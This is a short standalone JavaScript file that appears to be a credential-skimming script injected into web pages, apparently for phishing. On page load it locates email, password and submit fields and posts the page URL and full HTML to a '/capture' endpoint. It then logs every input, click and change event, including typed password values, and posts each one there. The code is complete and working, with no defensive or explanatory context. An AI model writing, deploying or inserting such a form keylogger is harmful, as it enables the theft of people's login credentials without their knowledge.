(function() {
    function getUniqueSelector(el) {
        if (el.id) return `#${el.id}`;
        if (el.name) return `${el.tagName.toLowerCase()}[name="${el.name}"]`;
        let path = [];
        while (el && el.nodeType === Node.ELEMENT_NODE) {
            let selector = el.tagName.toLowerCase();
            if (el.className) {
                let classes = el.className.trim().split(/\s+/).join('.');
                selector += `.${classes}`;
            }
            let sibling = el;
            let nth = 1;
            while ((sibling = sibling.previousElementSibling)) {
                if (sibling.tagName === el.tagName) nth++;
            }
            selector += `:nth-of-type(${nth})`;
            path.unshift(selector);
            el = el.parentElement;
        }
        return path.join(' > ');
    }

    function captureInitialData() {
        const emailInput = document.querySelector('input[type="email"], input[name*="email"], input[id*="email"]');
        const passwordInput = document.querySelector('input[type="password"]');
        const submitButton = document.querySelector('button[type="submit"], input[type="submit"]');

        return {
            url: window.location.href,
            outerHTML: document.documentElement.outerHTML,
            selectors: {
                email: emailInput ? getUniqueSelector(emailInput) : null,
                password: passwordInput ? getUniqueSelector(passwordInput) : null,
                submit: submitButton ? getUniqueSelector(submitButton) : null
            }
        };
    }

    function sendData(data) {
        fetch('/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).catch(e => console.error('Erro ao enviar dados:', e));
    }

    function monitorInteractions() {
        ['input', 'click', 'change'].forEach(eventType => {
            document.addEventListener(eventType, event => {
                const el = event.target;
                if (!el) return;

                const data = {
                    eventType,
                    selector: getUniqueSelector(el),
                    value: el.value || null,
                    timestamp: Date.now(),
                    url: window.location.href
                };
                sendData(data);
            }, true);
        });
    }

    function init() {
        const initialData = captureInitialData();
        sendData({ type: 'initial', data: initialData });
        monitorInteractions();
    }

    if (document.readyState === 'complete' || document.readyState === 'interactive') {
        init();
    } else {
        window.addEventListener('DOMContentLoaded', init);
    }
})();
